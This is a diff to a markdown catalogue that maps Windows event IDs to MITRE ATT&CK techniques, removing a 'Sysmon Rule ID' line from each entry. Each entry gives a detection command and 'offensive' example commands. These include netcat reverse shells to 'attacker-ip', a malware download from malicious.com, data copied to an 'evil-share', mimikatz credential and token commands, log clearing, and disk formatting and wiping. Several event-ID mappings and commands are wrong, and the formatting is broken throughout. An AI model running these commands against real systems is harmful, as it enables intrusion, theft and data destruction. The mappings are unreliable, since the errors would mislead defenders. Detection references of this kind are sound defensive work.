@@ -91,7 +91,6 @@ rating: 4.5
 **MITRE Tactic & Techniques:** Initial Access | Phishing [T1566.001]
 **Event ID & Code:** 4625 | FAILED_LOGON
 **Status Code:** 0x8007052e
-**Sysmon Rule ID:** 101
 **Commands and Code:** `Auditpol /set /subcategory:"Logon" /success:enable /failure:enable`
 **Description:** An attempt to log on with incorrect credentials was made.
 **Example Offensive Codes and Commands:** `net use \\target-system\IPC$ /user:username wrongpassword`
@@ -102,7 +101,6 @@ rating: 4.5
 **MITRE Tactic & Techniques:** Execution | Command and Scripting Interpreter [T1059]
 **Event ID & Code:** 4104 | POWERSHELL_SCRIPT_EXECUTION
 **Status Code:** N/A
-**Sysmon Rule ID:** 102
 **Commands and Code:** `Set-ExecutionPolicy Unrestricted`
 **Description:** Execution of PowerShell script detected.
 **Example Offensive Codes and Commands:** `powershell -ep bypass -f malicious.ps1`
@@ -113,7 +111,6 @@ rating: 4.5
 **MITRE Tactic & Techniques:** Exfiltration | Data Compressed [T1560.001]
 **Event ID & Code:** 5145 | FILE_SHARE_ACCESS
 **Status Code:** N/A
-**Sysmon Rule ID:** 103
 **Commands and Code:** `netsh trace start capture=yes`
 **Description:** Unauthorized access to file share detected.
 **Example Offensive Codes and Commands:** `copy /Z secretdata.zip \\evil-share\stolen-data\`
@@ -125,7 +122,6 @@ rating: 4.5
 **MITRE Tactic & Techniques:** Lateral Movement | Remote Services: SMB/Windows Admin Shares [T1021.002]
 **Event ID & Code:** 5145 | FILE_SHARE_ACCESS
 Status Code:** N/A
-Sysmon Rule ID:** 104
 Commands and Code:** `net share admin$ /grant:username,FULL`
 **Description:** Unauthorized access to administrative shares detected.
 **Example Offensive Codes and Commands:** `net use \\target-system\admin$ /user:username password`
@@ -136,7 +132,6 @@ Commands and Code:** `net share admin$ /grant:username,FULL`
 MITRE Tactic & Techniques:** Privilege Escalation | Bypass User Account Control [T1548.002]
 **Event ID & Code:** 4674 | PRIVILEGE_ELEVATION
 Status Code:** N/A
-**Sysmon Rule ID:** 105
 Commands and Code:** `schtasks /run /tn "elevatedtask"`
 **Description:** Attempt to elevate privileges detected.
 **Example Offensive Codes and Commands:** `bypassuac.exe`
@@ -147,7 +142,6 @@ Commands and Code:** `schtasks /run /tn "elevatedtask"`
 **MITRE Tactic & Techniques:** Command and Control | Commonly Used Port [T1043]
 **Event ID & Code:** 3 | NETWORK_CONNECTION
 **Status Code:** N/A
-**Sysmon Rule ID:** 106
 **Commands and Code:** `netstat -an | findstr "443"`
 **Description:** Unusual network connection on commonly used port detected.
 **Example Offensive Codes and Commands:** `nc -e cmd.exe attacker-ip 443`
@@ -158,7 +152,6 @@ Commands and Code:** `schtasks /run /tn "elevatedtask"`
  **MITRE Tactic & Techniques:** Credential Access | Credential Dumping [T1003]
 **Event ID & Code:** 1102 | LOG_CLEAR
 **Status Code:** N/A
-**Sysmon Rule ID:** 107
 **Commands and Code:** `wevtutil cl Security`
 **Description:** Security log cleared possibly to hide credential dumping.
 **Example Offensive Codes and Commands:** `mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"`
@@ -168,7 +161,6 @@ Commands and Code:** `schtasks /run /tn "elevatedtask"`
 **MITRE Tactic & Techniques:** Discovery | Domain Trust Discovery [T1482]
 **Event ID & Code:** 4648 | EXPLICIT_CREDENTIAL_LOGON
 **Status Code:** N/A
-**Sysmon Rule ID:** 108
 **Commands and Code:** `nltest /domain_trusts`
 **Description:** Explicit credential logon to discover domain trusts.
 Example Offensive Codes and Commands:** `nltest /dclist:domain`
@@ -180,7 +172,6 @@ Example Offensive Codes and Commands:** `nltest /dclist:domain`
 **MITRE Tactic & Techniques:** Discovery | Network Service Scanning [T1046]
 **Event ID & Code:** 3 | NETWORK_CONNECTION
 **Status Code:** N/A
-**Sysmon Rule ID:** 109
 **Commands and Code:** `netstat -an | findstr "SYN_SENT"`
 **Description:** Network scanning activity detected through unusual SYN_SENT statuses.
 **Example Offensive Codes and Commands:** `nmap -sS target-ip`
@@ -192,7 +183,6 @@ Example Offensive Codes and Commands:** `nltest /dclist:domain`
 **MITRE Tactic & Techniques:** Defense Evasion | Indicator Removal on Host [T1070.004]
 Event ID & Code:** 4663 | FILE_DELETED
 Status Code:** N/A
-**Sysmon Rule ID:** 110
 Commands and Code:** `del /F /Q malicious-file.exe`
 Description:** Deletion of files to evade detection or remove evidence.
 Example Offensive Codes and Commands:** `sdelete -p 7 malicious-file.exe`
@@ -205,7 +195,6 @@ ID: **011**
 MITRE Tactic & Techniques:** Persistence | Modify System Image [T1542.003]
 Event ID & Code:** 7045 | SERVICE_INSTALLED
 **Status Code:** N/A
-**Sysmon Rule ID:** 111
 Commands and Code:** `sc create malicioussvc binPath= "malicious-file.exe"`
 **Description:** Installation of a new service which could indicate system reconfiguration for persistence.
  **Example Offensive Codes and Commands:** `sc create evilservice binPath= "C:\path\to\malicious.exe"`
@@ -216,7 +205,6 @@ Commands and Code:** `sc create malicioussvc binPath= "malicious-file.exe"`
 **MITRE Tactic & Techniques:** Execution | Scripting [T1064]
 Event ID & Code:** 4104 | POWERSHELL_SCRIPT_EXECUTION
 **Status Code:** N/A
-**Sysmon Rule ID:** 112
 **Commands and Code:** `Set-ExecutionPolicy Bypass`
 Description:** Execution of scripts to automate tasks, potentially malicious.
 **Example Offensive Codes and Commands:** `powershell -File malicious-script.ps1`
@@ -229,7 +217,6 @@ Description:** Execution of scripts to automate tasks, potentially malicious.
 MITRE Tactic & Techniques:** Execution | Malicious File Execution [T1204]
 Event ID & Code:** 4688 | PROCESS_CREATED
 **Status Code:** N/A
-Sysmon Rule ID:** 113
 **Commands and Code:** `Get-Process -Name suspicious-process`
 Description:** Execution of a potentially malicious process.
 Example Offensive Codes and Commands:** `start malicious-file.exe`
@@ -240,7 +227,6 @@ ID:** 014
 MITRE Tactic & Techniques:** Lateral Movement | Remote File Copy [T1021.002]
 Event ID & Code:** 4697 | SERVICE_CREATED
 **Status Code:** N/A
-**Sysmon Rule ID:** 114
 **Commands and Code:** `sc \\remote-system create remotesvc binPath= "malicious-file.exe"`
 **Description:** Creation of a new service for remote process execution.
 Example Offensive Codes and Commands:** `psexec \\remote-system -c malicious-file.exe`
@@ -251,7 +237,6 @@ Example Offensive Codes and Commands:** `psexec \\remote-system -c malicious-fil
 MITRE Tactic & Techniques:** Execution | Scripting [T1064]
 **Event ID & Code:** 4104 | POWERSHELL_SCRIPT_EXECUTION
 **Status Code:** N/A
-Sysmon Rule ID:** 115
 Commands and Code:** `powershell -File script.ps1`
 **Description:** Execution of PowerShell scripts to initiate processes.
 **Example Offensive Codes and Commands:** `powershell -EncodedCommand [Base64EncodedScript]`
@@ -262,7 +247,6 @@ Commands and Code:** `powershell -File script.ps1`
 **MITRE Tactic & Techniques:** Defense Evasion | Process Injection [T1055]
 Event ID & Code:** 8 | CREATE_PROCESS
 Status Code:** N/A
-**Sysmon Rule ID:** 116
 Commands and Code:** `Get-Process -Name injected-process`
 Description:** Process injection to evade detection and execute malicious code.
 **Example Offensive Codes and Commands:** `Inject-Process -ProcessName legitimate-process -Payload malicious-payload`
@@ -273,7 +257,6 @@ Description:** Process injection to evade detection and execute malicious code.
 **MITRE Tactic & Techniques:** Execution | Scheduled Task/Job [T1053]
 **Event ID & Code:** 4698 | SCHEDULED_TASK_CREATED
 **Status Code:** N/A
-Sysmon Rule ID:** 117
 Commands and Code:** `schtasks /create /tn "malicious-task" /tr "malicious-file.exe"`
 Description:** Creation of scheduled tasks to execute processes at specified times.
 Example Offensive Codes and Commands:** `schtasks /run /tn "malicious-task"`
@@ -286,7 +269,6 @@ Example Offensive Codes and Commands:** `schtasks /run /tn "malicious-task"`
 **MITRE Tactic & Techniques:** Defense Evasion | Token Manipulation [T1134]
 Event ID & Code:** 4672 | SPECIAL_PRIVILEGES_ASSIGNED
 **Status Code:** N/A
-**Sysmon Rule ID:** 118
 Commands and Code:** `whoami /priv`
 Description:** Assignment of special privileges indicative of token impersonation.
 Example Offensive Codes and Commands:** `mimikatz "privilege::debug" "token::elevate"`
@@ -297,7 +279,6 @@ ID:** 019
 MITRE Tactic & Techniques:** Privilege Escalation | Create Process with Token [T1134.002]
 Event ID & Code:** 4688 | PROCESS_CREATED
 Status Code:** N/A
-**Sysmon Rule ID:** 119
 Commands and Code:** `Get-Process -Name new-process`
 **Description:** New process created with a token from another process.
 **Example Offensive Codes and Commands:** `mimikatz "token::run" "process::create"`
@@ -308,7 +289,6 @@ Commands and Code:** `Get-Process -Name new-process`
 MITRE Tactic & Techniques:** Defense Evasion | Token Manipulation [T1134]
 Event ID & Code:** 1102 | DUPLICATE_TOKEN
 Status Code:** N/A
-Sysmon Rule ID:** 120
 Commands and Code:** `Get-EventLog -LogName Security -InstanceId 1102`
 Description:** Duplication of a token to use in a new process.
 Example Offensive Codes and Commands:** `mimikatz "token::duplicate"`
@@ -319,7 +299,6 @@ ID:** 021
 MITRE Tactic & Techniques:** Privilege Escalation | Modify Token [T1134.005]
 **Event ID & Code:** 4673 | TOKEN_PRIVILEGES_MODIFIED
 Status Code:** N/A
-Sysmon Rule ID:** 121
 Commands and Code:** `whoami /priv`
 Description:** Modification of token privileges to elevate or change permissions.
 **Example Offensive Codes and Commands:** `mimikatz "token::addpriv" "SeDebugPrivilege"`
@@ -330,7 +309,6 @@ Description:** Modification of token privileges to elevate or change permissions
 **MITRE Tactic & Techniques:** Defense Evasion | Token Manipulation [T1134]
 Event ID & Code:** 4672 | SPECIAL_PRIVILEGES_ASSIGNED
 Status Code:** N/A
-**Sysmon Rule ID:** 122
 Commands and Code:** `whoami /priv`
 Description:** Theft of a token to impersonate another user or escalate privileges.
 **Example Offensive Codes and Commands:** `mimikatz "token::steal" [Token ID]`
@@ -342,7 +320,6 @@ Description:** Theft of a token to impersonate another user or escalate privileg
 MITRE Tactic & Techniques:** Execution | PowerShell [T1059.001]
 Event ID & Code:** 4104 | SCRIPT_BLOCK_LOGGING
 **Status Code:** N/A
-Sysmon Rule ID:** 123
 **Commands and Code:** `Set-ExecutionPolicy Bypass`
 Description:** Execution of PowerShell scripts which could be malicious.
 Example Offensive Codes and Commands:** `powershell -File malicious-script.ps1`
@@ -353,7 +330,6 @@ Example Offensive Codes and Commands:** `powershell -File malicious-script.ps1`
 **MITRE Tactic & Techniques:** Lateral Movement | Remote PowerShell Session [T1021.006]
 Event ID & Code:** 4103 | ENGINE_LIFECYCLE
 Status Code:** N/A
-Sysmon Rule ID:** 124
 Commands and Code:** `Enter-PSSession -ComputerName target-system`
 Description:** Initiating a remote PowerShell session for lateral movement.
 Example Offensive Codes and Commands:** `Invoke-Command -ComputerName target-system -ScriptBlock { malicious-command }`
@@ -364,7 +340,6 @@ Example Offensive Codes and Commands:** `Invoke-Command -ComputerName target-sys
 MITRE Tactic & Techniques:** Command and Control | Ingress Tool Transfer [T1105]
 **Event ID & Code:** 4104 | SCRIPT_BLOCK_LOGGING
 Status Code:** N/A
-Sysmon Rule ID:** 125
 Commands and Code:** `IWR -URI http://malicious.com/malware.exe -OutFile C:\path\malware.exe`
 - **Description:** PowerShell used to download malicious files from external sources.
 - **Example Offensive Codes and Commands:** `powershell -command "IWR -URI http://malicious.com/malware.exe -OutFile C:\path\malware.exe"`
@@ -375,7 +350,6 @@ Commands and Code:** `IWR -URI http://malicious.com/malware.exe -OutFile C:\path
 **MITRE Tactic & Techniques:** Credential Access | Credential Dumping [T1003]
 Event ID & Code:** 4104 | SCRIPT_BLOCK_LOGGING
 Status Code:** N/A
-Sysmon Rule ID:** 126
 Commands and Code:** `Get-WmiObject -Class Win32_UserAccount`
 Description:** PowerShell commands used to access or dump credentials.
 Example Offensive Codes and Commands:** `powershell -command "Get-WmiObject -Class Win32_UserAccount"`
@@ -386,7 +360,6 @@ Example Offensive Codes and Commands:** `powershell -command "Get-WmiObject -Cla
 MITRE Tactic & Techniques:** Defense Evasion | Modify Registry [T1112]
 Event ID & Code:** 4104 | SCRIPT_BLOCK_LOGGING
 **Status Code:** N/A
-**Sysmon Rule ID:** 127
 Commands and Code:** `Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\malicious-service' -Name "Start" -Value 2`
 Description:** PowerShell commands used to modify registry entries for evasion or persistence.
 Example Offensive Codes and Commands:** `powershell -command "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\malicious-service' -Name 'Start' -Value 2"`
@@ -400,7 +373,6 @@ Example Offensive Codes and Commands:** `powershell -command "Set-ItemProperty -
 MITRE Tactic & Techniques:** Persistence | Event Triggered Execution: Windows Management Instrumentation Event Subscription [T1546.003]
 Event ID & Code:** 5859 | WMI_EVENT_FILTER_TO_CONSUMER_BINDING
 **Status Code:** N/A
-Sysmon Rule ID:** 133
 Commands and Code:** `Get-WmiObject -Class __EventFilter -Namespace root\subscription`
 Description:** Binding of WMI filter to consumer indicating a potential persistence mechanism.
 **Example Offensive Codes and Commands:** `wmic /namespace:\\root\subscription /interactive:off PATH CommandLineEventConsumer CREATE`
@@ -411,7 +383,6 @@ Description:** Binding of WMI filter to consumer indicating a potential persiste
 MITRE Tactic & Techniques:** Lateral Movement | Remote Services: Windows Management Instrumentation [T1021.005]
 Event ID & Code:** 5858 | WMI_ACTIVITY_EXECQUERY
 Status Code:** N/A
-**Sysmon Rule ID:** 134
 Commands and Code:** `Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "malicious-file.exe"`
 Description:** Remote execution of commands or scripts via WMI.
 Example Offensive Codes and Commands:** `wmic /node:target-system process call create "malicious-file.exe"`
@@ -422,7 +393,6 @@ Example Offensive Codes and Commands:** `wmic /node:target-system process call c
 MITRE Tactic & Techniques:** Discovery | Remote System Discovery [T1018]
 Event ID & Code:** 5858 | WMI_ACTIVITY_EXECQUERY
 **Status Code:** N/A
-**Sysmon Rule ID:** 135
 Commands and Code:** `Get-WmiObject -Class Win32_ComputerSystem`
 Description:** Querying system information via WMI for reconnaissance.
 Example Offensive Codes and Commands:** `wmic computersystem get model,name,manufacturer`
@@ -433,7 +403,6 @@ ID:** 036
 MITRE Tactic & Techniques:** Defense Evasion | Modify System Image [T1542.003]
 Event ID & Code:** 5858 | WMI_ACTIVITY_EXECQUERY
 Status Code:** N/A
-Sysmon Rule ID:** 136
 Commands and Code:** `Set-WmiInstance -Class Win32_OperatingSystem -Property @{Description='Modified System'}`
 Description:** Modifying system configurations via WMI.
 Example Offensive Codes and Commands:** `wmic os set description="Modified System"`
@@ -444,7 +413,6 @@ ID:** 037
 **MITRE Tactic & Techniques:** Execution | Service Execution [T1569.002]
 Event ID & Code:** 5858 | WMI_ACTIVITY_EXECQUERY
 Status Code:** N/A
-Sysmon Rule ID:** 137
 Commands and Code:** `Get-WmiObject -Class Win32_Service | Where-Object {$_.Name -eq 'malicioussvc'} | Invoke-WmiMethod -Name StartService`
 Description:** Controlling services via WMI.
 Example Offensive Codes and Commands:** `wmic service malicioussvc call startservice`
@@ -457,7 +425,6 @@ Example Offensive Codes and Commands:** `wmic service malicioussvc call startser
 MITRE Tactic & Techniques:** Command and Control | Commonly Used Port [T1043]
 Event ID & Code:** 5157 | FIREWALL_BLOCK
 Status Code:** N/A
-Sysmon Rule ID:** 138
 Commands and Code:** `Get-WinEvent -LogName "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall"`
 Description:** Firewall blocked unauthorized outbound traffic to a suspicious IP.
 **Example Offensive Codes and Commands:** `nc -e cmd.exe attacker-ip 443`
@@ -468,7 +435,6 @@ ID:** 039
 MITRE Tactic & Techniques:** Initial Access | External Remote Services [T1133]
 Event ID & Code:** 5157 | FIREWALL_BLOCK
 Status Code:** N/A
-Sysmon Rule ID:** 139
 Commands and Code:** `netsh advfirewall firewall show rule name=all`
 Description:** Firewall blocked an unauthorized inbound connection attempt.
 Example Offensive Codes and Commands:** `nc -lvp 4444`
@@ -479,7 +445,6 @@ ID:** 040
 MITRE Tactic & Techniques:** Defense Evasion | Proxy/Protocol Evasion [T1090.003]
 **Event ID & Code:** 5157 | FIREWALL_BLOCK
 **Status Code:** N/A
-**Sysmon Rule ID:** 140
 Commands and Code:** `Get-NetFirewallRule -Direction Outbound | Where-Object { $_.Enabled -eq True }`
 Description:** Unauthorized attempt to bypass proxy restrictions detected.
 Example Offensive Codes and Commands:** `curl -x http://evil-proxy:8080 http://target-website.com`
@@ -490,7 +455,6 @@ ID:** 041
 MITRE Tactic & Techniques:** Command and Control | Web Service [T1102]
 Event ID & Code:** 5157 | FIREWALL_BLOCK
 Status Code:** N/A
-Sysmon Rule ID:** 141
 Commands and Code:** `grep "suspicious-url" /var/log/proxy.log`
 **Description:** Firewall or proxy log showing a request to a suspicious URL.
 Example Offensive Codes and Commands:** `curl http://suspicious-url.com/malicious-payload`
@@ -501,7 +465,6 @@ ID:** 042
 MITRE Tactic & Techniques:** Command and Control | Non-Standard Port [T1571]
 Event ID & Code:** 5157 | FIREWALL_BLOCK
 Status Code:** N/A
-Sysmon Rule ID:** 142
 Commands and Code:** `netsh advfirewall firewall add rule name="Block Non-Standard Port" dir=out remoteport=1337 action=block`
 Description:** Firewall blocked traffic on a non-standard port indicating unusual protocol usage.
 Example Offensive Codes and Commands:** `nc -e cmd.exe attacker-ip 1337`
@@ -514,7 +477,6 @@ Example Offensive Codes and Commands:** `nc -e cmd.exe attacker-ip 1337`
 MITRE Tactic & Techniques:** Defense Evasion | Obfuscated Files or Information [T1027]
 **Event ID & Code:** 4104 | SCRIPT_BLOCK_LOGGING
 Status Code:** N/A
-Sysmon Rule ID:** 143
 Commands and Code:** `powershell -encodedcommand <Base64EncodedCommand>`
 Description:** Executing obfuscated PowerShell commands.
 **Example Offensive Codes and Commands:** `powershell -encodedcommand U3RhcnQtUHJvY2Vzcw==` (Base64 for `Start-Process`)
@@ -525,7 +487,6 @@ Description:** Executing obfuscated PowerShell commands.
 MITRE Tactic & Techniques:** Defense Evasion | Indicator Blocking [T1054]
 Event ID & Code:** 7045 | SERVICE_INSTALLED
 Status Code:** N/A
-Sysmon Rule ID:** 144
 Commands and Code:** `sc config "SecurityService" start= disabled`
 Description:** Disabling security services to evade detection.
 Example Offensive Codes and Commands:** `sc stop "SecurityService"`
@@ -536,7 +497,6 @@ ID:** 045
 MITRE Tactic & Techniques:** Defense Evasion | Indicator Removal on Host [T1070]
 Event ID & Code:** 1102 | LOG_CLEARED
 **Status Code:** N/A
-Sysmon Rule ID:** 145
 Commands and Code:** `wevtutil cl Security`
 Description:** Clearing event logs to hide malicious activities.
 Example Offensive Codes and Commands:** `wevtutil cl System`
@@ -547,7 +507,6 @@ ID:** 046
 MITRE Tactic & Techniques:** Defense Evasion | Bypass User Access Control [T1548.002]
 Event ID & Code:** 4673 | SENSITIVE_PRIVILEGE_USE
 Status Code:** N/A
-Sysmon Rule ID:** 146
 Commands and Code:** `fodhelper.exe`
 Description:** Utilizing binaries to bypass UAC and elevate privileges.
 Example Offensive Codes and Commands:** `fodhelper.exe malicious-script.ps1`
@@ -558,7 +517,6 @@ Example Offensive Codes and Commands:** `fodhelper.exe malicious-script.ps1`
 **MITRE Tactic & Techniques:** Defense Evasion | Rootkit [T1014]
 Event ID & Code:** 7000 | SERVICE_START_FAILED
 Status Code:** N/A
-Sysmon Rule ID:** 147
 **Commands and Code:** `sc create rootkit binPath= "C:\path\rootkit.sys"`
 Description:** Installing a rootkit to hide malicious processes and files.
 Example Offensive Codes and Commands:** `sc start rootkit`
@@ -570,7 +528,6 @@ Example Offensive Codes and Commands:** `sc start rootkit`
 MITRE Tactic & Techniques:** Impact | Data Destruction [T1485]
 Event ID & Code:** 4660 | OBJECT_DELETED
 Status Code:** N/A
-Sysmon Rule ID:** 148
 **Commands and Code:** `del /F /Q C:\important\*`
 Description:** Deliberate deletion of critical data.
 Example Offensive Codes and Commands:** `cipher /W:C:\important`
@@ -581,7 +538,6 @@ Example Offensive Codes and Commands:** `cipher /W:C:\important`
 **MITRE Tactic & Techniques:** Impact | Disk Wipe [T1561]
 Event ID & Code:** 4660 | OBJECT_DELETED
 Status Code:** N/A
-**Sysmon Rule ID:** 149
 Commands and Code:** `format C: /P:1`
 Description:** Formatting the disk to wipe data.
 Example Offensive Codes and Commands:** `diskpart clean disk 0`
@@ -592,7 +548,6 @@ ID:** 050
 **MITRE Tactic & Techniques:** Impact | Resource Hijacking [T1496]
 Event ID & Code:** 4689 | PROCESS_TERMINATED
 Status Code:** N/A
-Sysmon Rule ID:** 150
 Commands and Code:** `start cryptominer.exe`
 Description:** Unauthorized use of resources for cryptomining.
 Example Offensive Codes and Commands:** `cryptominer.exe -pool miningpool.com -user username -pass password`
@@ -603,7 +558,6 @@ ID:** 051
 MITRE Tactic & Techniques:** Impact | Inhibit System Recovery [T1490]
 Event ID & Code:** 7034 | SERVICE_CRASHED
 Status Code:** N/A
-Sysmon Rule ID:** 151
 Commands and Code:** `net stop "Critical Service"`
 **Description:** Stopping critical services to impair system recovery.
 Example Offensive Codes and Commands:** `sc stop "Critical Service"`
@@ -614,7 +568,6 @@ Example Offensive Codes and Commands:** `sc stop "Critical Service"`
 MITRE Tactic & Techniques:** Impact | Endpoint Denial of Service [T1498]
 Event ID & Code:** 4226 | TCP/IP_CONNECTION_LIMIT_REACHED
 Status Code:** N/A
-Sysmon Rule ID:** 152
 Commands and Code:** `hping3 --flood --rand-source target-system`
 Description:** Flooding the target system with network requests to cause denial of service.
 **Example Offensive Codes and Commands:** `loic.exe /target target-system /method TCP /threads 10`
